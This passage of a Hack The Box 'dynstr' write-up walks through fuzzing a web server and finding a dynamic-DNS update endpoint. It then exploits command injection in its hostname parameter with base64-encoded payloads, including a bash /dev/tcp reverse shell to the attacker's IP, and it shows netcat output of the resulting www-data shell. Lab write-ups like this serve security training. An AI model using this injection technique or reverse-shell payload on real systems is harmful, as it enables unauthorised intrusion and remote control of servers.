<h3 id="Directory-Fuzzing"><a href="#Directory-Fuzzing" class="headerlink" title="Directory Fuzzing"></a>Directory Fuzzing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/ffuf]</span><br><span class="line">└─<span class="comment"># ./ffuf -u http://dyna.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c -e .txt,.php,.html</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.1.0-git</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://dyna.htb/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt</span></span><br><span class="line"><span class="string"> :: Extensions       : .txt .php .html </span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.htpasswd.html          [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htpasswd.php           [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htaccess.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htaccess.html          [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htaccess.php           [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htpasswd.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">index.html              [Status: 200, Size: 10909, Words: 1937, Lines: 282]</span></span><br><span class="line"><span class="string">nic                     [Status: 301, Size: 302, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">:: Progress: [81876/81876] :: Job [1/1] :: 388 req/sec :: Duration: [0:03:31] :: Errors: 104 ::</span></span><br></pre></td></tr></table></figure>

<p>we have intresting nic directory.<br>Visiting that nic directory we can see just a blank page so let’s the and fuzz that directory again.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/ffuf]</span><br><span class="line">└─<span class="comment"># ./ffuf -u http://dyna.htb/nic/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c </span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://dyna.htb/nic/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">update                  [Status: 200, Size: 8, Words: 1, Lines: 2]</span></span><br><span class="line"><span class="string">:: Progress: [20469/20469] :: Job [1/1] :: 982 req/sec :: Duration: [0:00:38] :: Errors: 3 ::</span></span><br></pre></td></tr></table></figure>
<p>We got the subdirectory update let’s check it.<br>Visiting the directory we got the bad auth as output.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2002.jpg"></li>
</ul>
<p>From earlier we have creds for beta version of the website.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2003.jpg"></li>
</ul>
<p>So let’s try to auth with HTTP basic authentication.<br>I wrote a simple python script for that</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>Running the script we get the following output.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># python3 script.py </span></span><br><span class="line">nochg 10.10.14.10</span><br></pre></td></tr></table></figure>

<p>at first I didn’t understand nochg in reponse so I google nochg and landed on the following article.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9oZWxwLmR5bi5jb20vcmVtb3RlLWFjY2Vzcy1hcGkvcmV0dXJuLWNvZGVzLw==">Return Codes (RA-API)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>It looks like it’s an API for dynamic DNS and we are at the update portal.</p>
<p>Looking at the following article we can see how to perform updates.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9oZWxwLmR5bi5jb20vcmVtb3RlLWFjY2Vzcy1hcGkvcGVyZm9ybS11cGRhdGUv">Perform Update (RA-API)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>looking at the example in article I knew that I have to pass two parameter atleast to perform update i.e the hostname and myip so let’s try it.</p>
<p>Again going back to website we know we have few dynamic dns running so let’s try and get it.</p>
<p>Updated python script to perform updates</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&#x27;myip&#x27;</span> : <span class="string">&#x27;10.10.14.10&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;hostname&#x27;</span>: <span class="string">&#x27;test.no-ip.htb&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>), params=params)</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>let’s send this request.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># python3 script.py </span></span><br><span class="line">good 10.10.14.10</span><br></pre></td></tr></table></figure>

<p>we got the good response so we can perform update now let’s look at some parameters we can tamper.</p>
<p>Looking through the above perform update article I can see one intresting thing that the update will get distributed to all the linked device so if we can inject the hostname we can get the possible RCE and I thought about injecting IP but it’s is not possible as it will lead to validation problem as IP cannot have character so we can inject hostname and send payload as subdomain name but we cannot use special chars as it is not allowed as a domain name so we have base64 encode the payload and send the request.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;id&#x27;</span></span><br><span class="line">final = b64encode(payload)</span><br><span class="line"><span class="built_in">print</span> (final)</span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&#x27;myip&#x27;</span> : <span class="string">&#x27;10.10.14.10&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;hostname&#x27;</span>: <span class="string">&#x27;&#123;&#125;.no-ip.htb&#x27;</span>.<span class="built_in">format</span>(final)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>), params=params)</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>let’s run the script.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># python3 script.py </span></span><br><span class="line">b<span class="string">&#x27;aWQ=&#x27;</span></span><br><span class="line">911 [nsupdate failed]</span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cubm9pcC5jb20vaW50ZWdyYXRlL3JlcXVlc3Q=">noip request<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>It said nsudate failed so we know that we cannot update ns record but going through documentation we have an option to push update offline.</p>
<p>so let’s try that.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;pwd&#x27;</span></span><br><span class="line">final = b64encode(payload)</span><br><span class="line"><span class="comment">#print (final)</span></span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&#x27;myip&#x27;</span> : <span class="string">&#x27;10.10.14.10&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;hostname&#x27;</span>: <span class="string">&#x27;`echo &quot;&#123;&#125;&quot; | base64 -d | bash`test.no-ip.htb&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(final)),</span><br><span class="line">	<span class="string">&#x27;offline&#x27;</span>: <span class="string">&#x27;YES&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>), params=params)</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>we get the output</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># python3 script.py </span></span><br><span class="line">good 10.10.14.10</span><br></pre></td></tr></table></figure>

<p>Looks like it could to blind RCE so let’s try and ping your machine.<br>UPDATED script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;ping -c 4 10.10.14.10&#x27;</span></span><br><span class="line">final = b64encode(payload)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(final.decode()))</span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&#x27;myip&#x27;</span> : <span class="string">&#x27;10.10.14.10&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;hostname&#x27;</span>: <span class="string">&#x27;`echo &quot;&#123;&#125;&quot; | base64 -d | bash`&quot;dynadns.no-ip.htb&#x27;</span>.<span class="built_in">format</span>(final.decode()),</span><br><span class="line">	<span class="string">&#x27;offline&#x27;</span>: <span class="string">&#x27;YES&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>), params=params)</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>Running the script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># python3 script.py </span></span><br><span class="line">cGluZyAtYyA0IDEwLjEwLjE0LjEw</span><br><span class="line">server 127.0.0.1</span><br><span class="line">zone no-ip.htb</span><br><span class="line">update delete PING 10.10.14.10 (10.10.14.10) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.10.14.10: icmp_seq=1 ttl=63 time=300 ms</span><br><span class="line">64 bytes from 10.10.14.10: icmp_seq=2 ttl=63 time=299 ms</span><br><span class="line">64 bytes from 10.10.14.10: icmp_seq=3 ttl=63 time=299 ms</span><br><span class="line">64 bytes from 10.10.14.10: icmp_seq=4 ttl=63 time=298 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.14.10 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3004ms</span><br><span class="line">rtt min/avg/max/mdev = 297.622/298.907/300.286/0.946 msdynadns.no-ip.htb</span><br><span class="line">good 10.10.14.10</span><br></pre></td></tr></table></figure>

<p>Got the ping back</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># tcpdump -i tun0 -n icmp</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span><br><span class="line">01:51:41.981360 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">01:51:41.981456 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">01:51:42.980493 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">01:51:42.980513 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">01:51:43.981906 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">01:51:43.981921 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">01:51:44.982448 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">01:51:44.982463 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">01:51:45.289182 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">01:51:45.289253 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">01:51:46.289399 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">01:51:46.289414 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">01:51:47.290146 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">01:51:47.290164 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">01:51:48.291232 IP 10.10.10.244 &gt; 10.10.14.10: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">01:51:48.291246 IP 10.10.14.10 &gt; 10.10.10.244: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 2, <span class="built_in">seq</span> 4, length 64</span><br></pre></td></tr></table></figure>

<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>Let’s get the revshell back to our machine</p>
<h2 id="Don’t-forget-to-spin-up-listener-on-that-port"><a href="#Don’t-forget-to-spin-up-listener-on-that-port" class="headerlink" title="Don’t forget to spin up listener on that port."></a>Don’t forget to spin up listener on that port.</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://dyna.htb/nic/update&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.10/1122 0&gt;&amp;1&#x27;</span></span><br><span class="line">final = b64encode(payload)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(final.decode()))</span><br><span class="line">params = &#123;</span><br><span class="line">	<span class="string">&#x27;myip&#x27;</span> : <span class="string">&#x27;10.10.14.10&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;hostname&#x27;</span>: <span class="string">&#x27;`echo &quot;&#123;&#125;&quot; | base64 -d | bash`&quot;dynadns.no-ip.htb&#x27;</span>.<span class="built_in">format</span>(final.decode()),</span><br><span class="line">	<span class="string">&#x27;offline&#x27;</span>: <span class="string">&#x27;YES&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>, auth=HTTPBasicAuth(<span class="string">&#x27;dynadns&#x27;</span>, <span class="string">&#x27;sndanyd&#x27;</span>), params=params)</span><br><span class="line"><span class="built_in">print</span> (res.text)</span><br></pre></td></tr></table></figure>

<p>on NC</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># rlwrap nc -nlvp 1122</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1122</span><br><span class="line">Ncat: Listening on 0.0.0.0:1122</span><br><span class="line">Ncat: Connection from 10.10.10.244.</span><br><span class="line">Ncat: Connection from 10.10.10.244:53898.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (745): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">www-data@dynstr:/var/www/html/nic$</span><br></pre></td></tr></table></figure>

<p>We have REV shell now let’s go onto user.</p>
<h1 id="WWW-Data-to-bindmgr"><a href="#WWW-Data-to-bindmgr" class="headerlink" title="WWW-Data to bindmgr"></a>WWW-Data to bindmgr</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /home</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root    root    4096 Mar 15 20:26 .</span><br><span class="line">drwxr-xr-x 18 root    root    4096 May 25 14:52 ..</span><br><span class="line">drwxr-xr-x  5 bindmgr bindmgr 4096 Mar 15 20:39 bindmgr</span><br><span class="line">drwxr-xr-x  3 dyna    dyna    4096 Mar 18 20:00 dyna</span><br></pre></td></tr></table></figure>

<p>Looks like we have access to both of the users.<br>let’s check bindmgr</p>
